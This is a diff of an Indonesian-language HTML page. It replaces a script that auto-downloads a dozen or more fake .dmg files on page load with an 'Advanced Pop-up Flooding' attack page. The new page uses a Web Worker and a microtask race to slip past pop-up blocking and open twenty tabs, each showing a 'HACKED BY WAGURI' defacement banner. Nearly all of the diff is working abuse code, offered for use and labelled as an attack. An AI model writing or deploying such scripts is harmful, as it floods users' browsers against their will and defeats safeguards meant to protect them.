@@ -1,96 +1,105 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Multiple Auto Download (Race Condition)</title>
-<style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
-.panel { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); max-width: 600px; width: 100%; }
-h2 { color: #d32f2f; margin-bottom: 10px; }
-p { margin-bottom: 20px; line-height: 1.6; color: #555; }
-#status { margin-top: 20px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; border: 1px solid #ffcdd2; }
-.log { background: #1e1e1e; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 120px; overflow-y: auto; font-size: 12px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Blob Pop-up Flooding</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
+        .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
+        h2 { color: #ff4444; margin-bottom: 10px; text-shadow: 0 0 10px #ff4444; }
+        p { margin-bottom: 20px; line-height: 1.6; color: #aaa; }
+        button { width: 100%; padding: 18px; cursor: pointer; border: none; border-radius: 8px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4); transition: background 0.2s; }
+        button:hover { background: #b71c1c; }
+        #status { margin-top: 20px; font-weight: bold; color: #ff9800; padding: 12px; background: #111; border-radius: 6px; font-family: monospace; }
+    </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h2>Multiple Auto Download (Race)</h2>
-    <p>Memicu beberapa unduhan secara instan dalam satu microtask loop untuk menguji Race Condition.</p>
-    <div id="status" role="status">Memuat halaman...</div>
-    <div class="log" id="log">Menunggu log...</div>
+    <h2>⚠️ Advanced Pop-up Flooding</h2>
+    <p>Membuka banyak tab secara instan menggunakan Blob URL, Web Worker, dan Microtask Race Condition.</p>
+    <button id="start-btn" type="button">Mulai Serangan</button>
+    <div id="status" role="status">Sistem siap.</div>
 </div>
 
 <script>
+    const startBtn = document.getElementById("start-btn");
     const statusDiv = document.getElementById("status");
-    const logDiv = document.getElementById("log");
 
-    function log(msg) {
-        logDiv.innerHTML += "<br>> " + msg;
-        console.log(msg);
-    }
+    // Payload HTML untuk tab baru
+    const payloadHTML = `
+        <!DOCTYPE html>
+        <html>
+        <head><title>HACKED BY WAGURI</title></head>
+        <body style="margin:0;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;">
+            <div>
+                <h1 style="font-size:60px;color:red;text-shadow:0 0 20px red;animation:pulse 1s infinite;">TAB FLOODED</h1>
+                <p>Opened via Advanced Blob Race Condition.</p>
+            </div>
+            <style>@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }</style>
+        </body>
+        </html>
+    `;
 
-    // 1. Payload DMG
-    const createDmgPayload = () => {
-        const sizeInBytes = 1024; 
-        const bytes = new Uint8Array(sizeInBytes);
-        bytes[0] = 0x6B; bytes[1] = 0x6F; bytes[2] = 0x6C; bytes[3] = 0x79; // 'koly'
-        return bytes;
-    };
-
-    // 2. Fungsi Unduhan (Synchronous)
-    const triggerDownload = (id) => {
+    // Fungsi untuk membuka tab baru
+    const openTab = (id) => {
         try {
-            const bytes = createDmgPayload();
-            const blob = new Blob([bytes], { type: 'application/octet-stream' });
+            // Buat Blob URL baru
+            const blob = new Blob([payloadHTML], { type: 'text/html' });
             const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `Race_Payload_${id}.dmg`;
-            a.style.display = 'none';
-            document.body.appendChild(a);
             
-            // Eksekusi klik secara sinkron
-            a.click();
+            // Buka tab baru (Synchronous)
+            const win = window.open(url, '_blank');
             
-            // Cleanup dilakukan nanti agar tidak mengganggu proses loop
-            setTimeout(() => {
-                if (a.parentNode) document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-            }, 5000);
-            
-            log(`[RACE] File .dmg ke-${id} dipicu.`);
+            // Jika berhasil terbuka, suntikkan konten secara langsung (opsional)
+            if (win) {
+                win.document.write(payloadHTML);
+                win.document.close();
+            }
         } catch (e) {
-            log(`[RACE] File ke-${id} gagal: ${e.message}`);
+            console.log("Gagal:", e);
         }
     };
 
-    // 3. Pemicu Otomatis via DOMContentLoaded
-    window.addEventListener("DOMContentLoaded", () => {
-        statusDiv.textContent = "Memicu Race Condition...";
-        
-        // TRIK: Loop sinkron di dalam microtask
-        // Semua perintah ini dieksekusi sebelum browser sempat melakukan rendering ulang
-        queueMicrotask(() => {
-            for (let i = 1; i <= 10; i++) {
-                triggerDownload(i);
-            }
-        });
-        
-        // Fallback jika microtask gagal
-        setTimeout(() => {
-            if (logDiv.innerHTML === "Menunggu log...") {
-                log("[FALLBACK] Menjalankan loop fallback...");
-                for (let i = 11; i <= 15; i++) {
-                    triggerDownload(i);
-                }
-            }
-        }, 1000);
+    startBtn.addEventListener("click", () => {
+        startBtn.disabled = true;
+        statusDiv.textContent = "Mempersiapkan Web Worker...";
 
-        statusDiv.textContent = "Race Condition dieksekusi! Cek folder Download.";
-        statusDiv.style.color = "#4CAF50";
+        // 1. Buat Web Worker untuk memicu loop eksternal (Mengakali blokir main thread)
+        const workerCode = `
+            self.onmessage = function(e) {
+                if (e.data === 'START') {
+                    // Kirim sinyal kembali untuk setiap tab yang harus dibuka
+                    for (let i = 0; i < 20; i++) {
+                        self.postMessage('OPEN_TAB_' + i);
+                    }
+                }
+            };
+        `;
+        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+        const worker = new Worker(URL.createObjectURL(workerBlob));
+
+        // 2. Terima sinyal dari Worker dan buka tab di Main Thread
+        worker.onmessage = function(e) {
+            if (e.data.startsWith('OPEN_TAB_')) {
+                const id = e.data.split('_')[2];
+                
+                // TRIK RACE CONDITION: Buka tab langsung di dalam event handler Worker
+                openTab(id);
+                
+                statusDiv.textContent = `Membuka tab ke-${parseInt(id) + 1}...`;
+            }
+        };
+
+        // 3. Mulai Flooding
+        statusDiv.textContent = "Memicu tab flooding secara instan...";
+        
+        // Jalankan loop Microtask untuk menembak perintah secepat mungkin
+        queueMicrotask(() => {
+            worker.postMessage('START');
+        });
     });
 </script>
 </body>
